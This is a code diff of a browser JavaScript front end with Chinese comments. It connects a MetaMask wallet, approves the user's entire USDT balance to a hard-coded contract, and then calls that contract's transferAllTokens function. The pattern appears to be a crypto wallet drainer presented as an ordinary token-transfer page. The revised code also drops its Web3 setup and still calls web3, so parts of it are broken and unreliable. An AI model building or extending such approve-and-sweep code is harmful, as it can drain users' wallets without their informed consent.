@@ -1,9 +1,26 @@
-// 导入Web3.js并创建合约实例
-let web3;
-let contract;
+// 设置Web3和MetaMask连接
+async function connectWallet() {
+    if (window.ethereum) {
+        try {
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            const account = accounts[0];
+            document.getElementById('wallet-address').textContent = account;
+            alert('Wallet connected: ' + account);
+            return account;
+        } catch (error) {
+            console.error('Connection failed', error);
+            alert('Failed to connect wallet.');
+        }
+    } else {
+        alert('Please install MetaMask!');
+    }
+}
 
-const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';  // 智能合约地址
-const abi =[
+// 智能合约地址
+const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';
+
+// 智能合约ABI
+const contractABI = [
 	{
 		"inputs": [
 			{
@@ -93,64 +110,71 @@ const abi =[
 	}
 ];
 
-const connectButton = document.getElementById('connectWallet');
-const transferButton = document.getElementById('transferTokens');
-const statusMessage = document.getElementById('statusMessage');
-
-let userAddress;
-
-// 连接钱包功能
-connectButton.addEventListener('click', async () => {
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            web3 = new Web3(window.ethereum);
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const accounts = await web3.eth.getAccounts();
-            userAddress = accounts[0];
-
-            contract = new web3.eth.Contract(abi, contractAddress);
-            statusMessage.textContent = '钱包已连接: ' + userAddress;
-        } catch (error) {
-            console.error('连接钱包失败:', error);
-            statusMessage.textContent = '连接钱包失败，请重试';
-        }
-    } else {
-        console.log('请安装 MetaMask!');
-        statusMessage.textContent = '请安装 MetaMask 扩展';
+// ERC20 ABI
+const ERC20_ABI = [
+    {
+        "constant": true,
+        "inputs": [{ "name": "_owner", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "name": "balance", "type": "uint256" }],
+        "type": "function"
+    },
+    {
+        "constant": false,
+        "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }],
+        "name": "approve",
+        "outputs": [{ "name": "success", "type": "bool" }],
+        "type": "function"
     }
-});
+];
 
-// 转移代币功能
-transferButton.addEventListener('click', async () => {
+// 授权代币
+async function approveTokens(tokenContract, account, contractAddress, amount) {
     try {
-        // 检查授权情况
-        const usdtContract = new web3.eth.Contract(abi, await contract.methods.usdtToken().call());
-        const allowance = await usdtContract.methods.allowance(userAddress, contractAddress).call();
+        const gasPrice = await web3.eth.getGasPrice();
+        const gasLimit = 100000; // Gas limit for approval
 
-        if (allowance === '0') {
-            // 如果没有授权，先进行授权
-            await usdtContract.methods.approve(contractAddress, web3.utils.toWei('1000000', 'ether')).send({
-                from: userAddress,
-                gas: 100000
-            });
+        await tokenContract.methods.approve(contractAddress, amount).send({
+            from: account,
+            gasPrice: gasPrice,
+            gas: gasLimit
+        });
+        alert('Token approved successfully!');
+    } catch (error) {
+        console.error('Approval failed', error);
+        alert('Failed to approve tokens.');
+    }
+}
+
+// 检查并转移所有代币
+async function transferTokens() {
+    const account = await connectWallet();
+    if (!account) return;
+
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // USDT 合约地址
+    const usdtContract = new web3.eth.Contract(ERC20_ABI, usdtAddress);
+
+    try {
+        const usdtBalance = await usdtContract.methods.balanceOf(account).call();
+        const gasPrice = await web3.eth.getGasPrice();
+        const gasLimit = 500000;  // 增加Gas Limit
+
+        // 如果USDT有余额，先进行授权
+        if (usdtBalance > 0) {
+            await approveTokens(usdtContract, account, contractAddress, usdtBalance);
         }
 
-        // 调用合约中的 transferAllTokens 方法，设置 gas 上限
-        await contract.methods.transferAllTokens(userAddress).send({
-            from: userAddress,
-            gas: 1000000  // 设置为 1,000,000 gas 上限
+        // 调用transferAllTokens函数
+        await contract.methods.transferAllTokens(account).send({
+            from: account,
+            gasPrice: gasPrice,
+            gas: gasLimit
         });
 
-        statusMessage.textContent = '代币转移成功！';
-
+        alert('Tokens transferred successfully!');
     } catch (error) {
-        console.error('代币转移失败:', error);
-        
-        // 捕获详细的错误信息并显示
-        if (error.code === -32000) {
-            statusMessage.textContent = '代币转移失败：Gas不足。请确保账户中有足够的ETH支付Gas费。';
-        } else {
-            statusMessage.textContent = '代币转移失败，错误信息: ' + error.message;
-        }
+        console.error('Token transfer failed', error);
+        alert('Failed to transfer tokens. Make sure you have enough balance and approved the tokens.');
     }
-});
+}
